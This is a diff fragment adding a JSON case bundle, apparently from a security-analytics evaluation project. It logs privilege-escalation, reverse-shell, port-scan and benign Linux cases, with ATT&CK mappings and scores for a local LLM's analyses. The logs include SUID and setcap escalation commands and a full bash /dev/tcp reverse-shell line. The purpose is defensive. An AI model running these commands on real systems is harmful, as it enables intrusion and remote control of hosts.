+          "ts_original": "2024-08-06T14:01:04.626000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo systemctl status auditd.service (service_status_context)",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:04.646000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo systemctl status auditd.service (service_status_context)",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:04.974000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo systemctl status auditd.service (service_status_context)",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:13.666000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo systemctl status SplunkForwarder.service (service_status_context)",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:26.582000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo /opt/splunkforwarder/bin/splunk restart (service_restart_context)",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:26.590000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo /opt/splunkforwarder/bin/splunk restart (service_restart_context)",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:40.430000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo /opt/splunkforwarder/bin/splunk restart (service_restart_context)",
+          "ref": "E007",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:43.646000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo systemctl status SplunkForwarder.service (service_status_context)",
+          "ref": "E008",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:01:48.742000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo systemctl status SplunkForwarder.service (service_status_context)",
+          "ref": "E009",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:02:19.626000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo chmod u+s vuln (suid_change_candidate)",
+          "ref": "E010",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:02:19.634000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo chmod u+s vuln (suid_change_candidate)",
+          "ref": "E011",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:02:19.634000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo chmod u+s vuln (suid_change_candidate)",
+          "ref": "E012",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:02:19.634000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo chmod u+s vuln (suid_change_candidate)",
+          "ref": "E013",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:02:19.642000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo chmod u+s vuln (suid_change_candidate)",
+          "ref": "E014",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:02:19.646000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo chmod u+s vuln (suid_change_candidate)",
+          "ref": "E015",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:18:20.217000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate)",
+          "ref": "E016",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:18:20.221000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate)",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:20:36.405000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate)",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:20:36.413000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate)",
+          "ref": "E019",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:36:57.368000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate)",
+          "ref": "E020",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2024-08-06T14:36:57.376000Z",
+          "ts_quality": "original_utc",
+          "summary": "PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate)",
+          "ref": "E021",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 21,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 3,
+        "runs_reviewed": 1,
+        "final_analysis_id": "AN-20261018-221905-552c",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 15.71,
+        "wall_seconds": 80.91,
+        "validator_flags": 2,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 2,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "correct_findings": 7,
+        "incorrect_findings": 6,
+        "hallucinations_recorded": 5,
+        "source": "Week-2/Results/AN-20261018-221905-552c/analysis.json",
+        "all_runs": [
+          "AN-20261018-221905-552c",
+          "AN-20261024-134030-f61c",
+          "AN-20261024-134139-cd7f"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "source": "Week-2/Results/AN-20261018-221905-552c/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [
+        "PROCTITLE-only evidence: execution outcome, authorisation and successful escalation not established."
+      ],
+      "attack": [
+        {
+          "technique": "T1548.003",
+          "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+          "tactic": "Privilege Escalation",
+          "confidence": "candidate",
+          "basis": "sudo PROCTITLE records only; execution outcome and authorisation not established (LT-02 case study)"
+        }
+      ],
+      "stage_id": "S5"
+    },
+    {
+      "case_id": "LT-03",
+      "title": "Bash reverse-shell command pattern",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Verified-Timeline.csv",
+          "sha256": "1ebfe1bb05a52ffeb6422f409d6a077ea80ab134286f7221095dcab237250ff2"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Case-Study.md",
+          "sha256": "a29bbdee45be6f7a4f096c374d1261e308c9d5825e4981893db296e6586341bb"
+        }
+      ],
+      "facts": {
+        "host": "ip-10-0-255-92",
+        "user": "root",
+        "target_ip": "10.0.255.12",
+        "target_port": "4444",
+        "command_line": "bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53",
+        "process_guid": "{ec227f46-1086-665a-0dcf-bdc908560000}"
+      },
+      "events": [
+        {
+          "ts_original": "2024-05-31T18:01:42.639983000Z",
+          "ts_quality": "original_utc",
+          "summary": "/usr/bin/bash (parent /usr/bin/dash) user=root: bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 1,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 3,
+        "runs_reviewed": 3,
+        "final_analysis_id": "AN-20261019-021336-409d",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 17.11,
+        "wall_seconds": 49.81,
+        "validator_flags": 5,
+        "validator_severity_counts": {
+          "high": 2,
+          "medium": 3,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "correct_findings": 1,
+        "incorrect_findings": 1,
+        "hallucinations_recorded": 1,
+        "source": "Week-2/Results/AN-20261019-021336-409d/analysis.json",
+        "all_runs": [
+          "AN-20261018-231218-e901",
+          "AN-20261018-234042-ec78",
+          "AN-20261019-021336-409d"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "source": "Week-2/Results/AN-20261019-021336-409d/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": false,
+      "limitations": [
+        "Network success, interactive access and intent are unconfirmed (network_outcome=unknown)."
+      ],
+      "attack": [
+        {
+          "technique": "T1059.004",
+          "name": "Command and Scripting Interpreter: Unix Shell",
+          "tactic": "Execution",
+          "confidence": "observed_pattern",
+          "basis": "bash -c with /dev/tcp/10.0.255.12/4444 redirection (LT-03 verified timeline); network success unconfirmed"
+        }
+      ],
+      "stage_id": "S4"
+    },
+    {
+      "case_id": "LT-04",
+      "title": "Linux start-up (benign candidate)",
+      "domain": "endpoint",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv",
+          "sha256": "32a7d2870b3057d6c7efeb12bf9aa58af02706d11c9e77ffebe927e20791d482"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Case-Study.md",
+          "sha256": "d63f8eebb32dc01cea129af2f5969455f9b7678e4a2d2c007ced8528fcc36d3e"
+        }
+      ],
+      "facts": {
+        "host": "combo",
+        "programs": {
+          "network": 2,
+          "syslog": 2,
+          "kernel": 12,
+          "bluetooth": 2
+        }
+      },
+      "events": [
+        {
+          "ts_original": "Jul 27 14:41:54",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "network: Setting network parameters:  succeeded",
+          "ref": "E014",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:54",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "network: Bringing up loopback interface:  succeeded",
+          "ref": "E016",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:57",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "syslog: syslogd startup succeeded",
+          "ref": "E001",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:57",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: klogd 1.4.1, log source = /proc/kmsg started.",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:57",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: BIOS-e820: 00000000ffb00000 - 0000000100000000 (reserved)",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:57",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "syslog: klogd startup succeeded",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:57",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: Normal zone: 28334 pages, LIFO batch:6",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:57",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: mapped 4G/4G trampoline to ffff3000.",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:58",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: Memory: 125312k/129720k available (1540k kernel code, 3860k reserved, 599k data, 144k init, 0k highmem)",
+          "ref": "E007",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:58",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: Capability LSM initialized",
+          "ref": "E008",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:58",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: Intel machine check reporting enabled on CPU#0.",
+          "ref": "E009",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:58",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: NET: Registered protocol family 16",
+          "ref": "E010",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:58",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: usbcore: registered new driver usbfs",
+          "ref": "E011",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:59",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: PCI: Using IRQ router PIIX/ICH [8086/2410] at 0000:00:1f.0",
+          "ref": "E012",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:59",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "bluetooth: hcid startup succeeded",
+          "ref": "E013",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:59",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "bluetooth: sdpd startup succeeded",
+          "ref": "E015",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:41:59",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: Dquot-cache hash table entries: 1024 (order 0, 4096 bytes)",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "Jul 27 14:42:00",
+          "ts_quality": "no_year_no_timezone",
+          "summary": "kernel: Linux agpgart interface v0.100 (c) Dave Jones",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Linux-Benign/LT-04-Normal-Operations/LT-04-Verified-Timeline.csv"
+        }
+      ],
+      "event_count_total": 18,
+      "ai": {
+        "selection_rule": "latest Week-2 analysis with a recorded human review (else latest run)",
+        "runs_total": 2,
+        "runs_reviewed": 2,
+        "final_analysis_id": "AN-20261019-014603-c434",
+        "model": "mistral:7b-instruct-v0.3-q4_K_S",
+        "tokens_per_second": 18.23,
+        "wall_seconds": 56.7,
+        "validator_flags": 1,
+        "validator_severity_counts": {
+          "high": 0,
+          "medium": 1,
+          "low": 0
+        },
+        "review_status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "correct_findings": 1,
+        "incorrect_findings": 1,
+        "hallucinations_recorded": 3,
+        "source": "Week-2/Results/AN-20261019-014603-c434/analysis.json",
+        "all_runs": [
+          "AN-20261019-003000-126d",
+          "AN-20261019-014603-c434"
+        ]
+      },
+      "human_review": {
+        "status": "Corrected",
+        "analyst": "Mohammed Walid",
+        "source": "Week-2/Results/AN-20261019-014603-c434/analysis.json"
+      },
+      "tickets": [],
+      "benign_control": true,
+      "limitations": [],
+      "attack": [],
+      "stage_id": "FP"
+    },
+    {
+      "case_id": "NT-01",
+      "title": "Vertical TCP port scan",
+      "domain": "network",
+      "source_kind": "dataset_case",
+      "detection_rule": null,
+      "playbook": null,
+      "dataset": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning",
+      "evidence_files": [
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv",
+          "sha256": "dfc6ba445b6e95612feaa093757f591f8c2badb17da2cd922895fbec817c2ce0"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Case-Study.md",
+          "sha256": "12c9ba90c21d75046d1f533f0554e64fe83fe4d83c134563f3d3d2a0e7c2874e"
+        },
+        {
+          "path": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Full-Source-Statistics.json",
+          "sha256": "eae152db9b57ff82382beb5e03373c76ad28b0756a71ba2605d1ea8cee1bf5eb"
+        }
+      ],
+      "facts": {
+        "scanner_ip": "192.168.16.132",
+        "target_ip": "192.168.16.130",
+        "distinct_ports": 65535,
+        "tcp_records": 65747,
+        "rej": 65620,
+        "start_utc": "2026-05-26T06:07:27.414749Z",
+        "end_utc": "2026-05-26T06:19:45.683665Z"
+      },
+      "events": [
+        {
+          "ts_original": "2026-05-26T06:05:07.694185Z",
+          "ts_quality": "original_utc",
+          "summary": "udp 192.168.16.130:49949 -> 192.168.16.1:53 S0",
+          "ref": "E002",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:07:27.414749Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44834 -> 192.168.16.130:80 REJ",
+          "ref": "E003",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:07:28.502707Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44836 -> 192.168.16.130:2000 REJ",
+          "ref": "E004",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:08:35.524432Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:8888 REJ",
+          "ref": "E005",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:08:59.998968Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:62479 REJ",
+          "ref": "E006",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:09:00.009124Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:31871 REJ",
+          "ref": "E007",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:09:59.998569Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:52121 REJ",
+          "ref": "E008",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:10:00.008689Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:3953 REJ",
+          "ref": "E009",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:10:59.996012Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:17578 REJ",
+          "ref": "E010",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:11:00.006167Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:64112 REJ",
+          "ref": "E011",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:11:59.995460Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:43583 REJ",
+          "ref": "E012",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:12:00.005674Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:31639 REJ",
+          "ref": "E013",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:12:59.998727Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:47929 REJ",
+          "ref": "E014",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:13:00.008771Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:29631 REJ",
+          "ref": "E015",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:13:59.989944Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:40091 REJ",
+          "ref": "E016",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:14:00.000197Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:30246 REJ",
+          "ref": "E017",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:14:59.990955Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:47096 REJ",
+          "ref": "E018",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:15:00.001059Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:33129 REJ",
+          "ref": "E019",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:15:59.990796Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:58091 REJ",
+          "ref": "E020",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:16:00.001070Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:17635 REJ",
+          "ref": "E021",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:16:59.999142Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:50968 REJ",
+          "ref": "E022",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:17:00.009379Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:34382 REJ",
+          "ref": "E023",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:17:27.396836Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:65535 REJ",
+          "ref": "E024",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:17:59.993706Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:38607 REJ",
+          "ref": "E025",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:18:00.004096Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:25772 REJ",
+          "ref": "E026",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:18:59.992923Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:49145 REJ",
+          "ref": "E027",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:19:00.002947Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:2043 REJ",
+          "ref": "E028",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:19:10.930346Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:1 REJ",
+          "ref": "E029",
+          "source": "Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv"
+        },
+        {
+          "ts_original": "2026-05-26T06:19:45.683665Z",
+          "ts_quality": "original_utc",
+          "summary": "tcp 192.168.16.132:44372 -> 192.168.16.130:6739 REJ",
